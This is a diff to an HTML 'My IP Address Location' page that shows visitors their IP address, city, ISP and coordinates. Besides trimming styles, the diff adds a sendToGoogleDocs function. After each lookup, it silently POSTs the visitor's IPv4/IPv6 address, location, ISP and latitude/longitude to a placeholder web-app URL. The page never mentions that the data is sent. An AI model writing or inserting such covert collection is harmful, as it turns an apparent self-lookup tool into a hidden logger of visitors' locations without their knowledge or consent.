@@ -6,23 +6,18 @@
     <title>My IP Address Location</title>
     <style>
         body {
-            font-family: 'Poppins', sans-serif;
+            font-family: Arial, sans-serif;
             text-align: center;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
+            background-color: #f4f4f4;
+            padding: 20px;
         }
         .container {
-            margin: 50px auto;
-            width: 90%;
-            max-width: 600px;
             background: white;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        h2 {
-            color: #333;
+            max-width: 600px;
+            margin: auto;
         }
         button {
             background: #007bff;
@@ -31,8 +26,6 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            transition: 0.3s;
         }
         button:hover {
             background: #0056b3;
@@ -44,47 +37,23 @@
             border-radius: 8px;
             text-align: left;
         }
-        .ip-box h3 {
-            margin: 0;
-            color: #007bff;
-        }
-        .ip-box p {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #555;
-        }
-        .loading {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #777;
-            display: none;
-        }
-        hr {
-            border: 0;
-            height: 1px;
-            background: #ddd;
-            margin: 15px 0;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>Your IP Address & Location</h2>
         <button onclick="getIP()">Find My Location</button>
-        <p class="loading" id="loading">Fetching details...</p>
         <div id="ip-info"></div>
     </div>
 
     <script>
         function getIP() {
             let ipInfoDiv = document.getElementById("ip-info");
-            let loading = document.getElementById("loading");
-            ipInfoDiv.innerHTML = "";
-            loading.style.display = "block";
+            ipInfoDiv.innerHTML = "<p>Fetching IP...</p>";
 
             let ipv4, ipv6;
 
-            // Fetch IPv4 Address
+            // Fetch IPv4
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
@@ -107,10 +76,11 @@
                 `;
 
                 ipInfoDiv.innerHTML = ipv4Details;
+                sendToGoogleDocs(ipv4, data.city, data.region, data.country_name, data.org, data.latitude, data.longitude, "IPv4");
             })
             .catch(() => ipInfoDiv.innerHTML = "<p>Error fetching IPv4 details!</p>");
 
-            // Fetch IPv6 Address
+            // Fetch IPv6
             fetch('https://api64.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
@@ -132,11 +102,17 @@
                 `;
 
                 ipInfoDiv.innerHTML += ipv6Details;
-                loading.style.display = "none";
+                sendToGoogleDocs(ipv6, data.city, data.region, data.country_name, data.org, data.latitude, data.longitude, "IPv6");
             })
-            .catch(() => {
-                ipInfoDiv.innerHTML += "<p>Error fetching IPv6 details!</p>";
-                loading.style.display = "none";
+            .catch(() => ipInfoDiv.innerHTML += "<p>Error fetching IPv6 details!</p>");
+        }
+
+        function sendToGoogleDocs(ip, city, region, country, isp, lat, lon, version) {
+            fetch("YOUR_WEB_APP_URL", {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ ip, city, region, country, isp, lat, lon, version })
             });
         }
     </script>
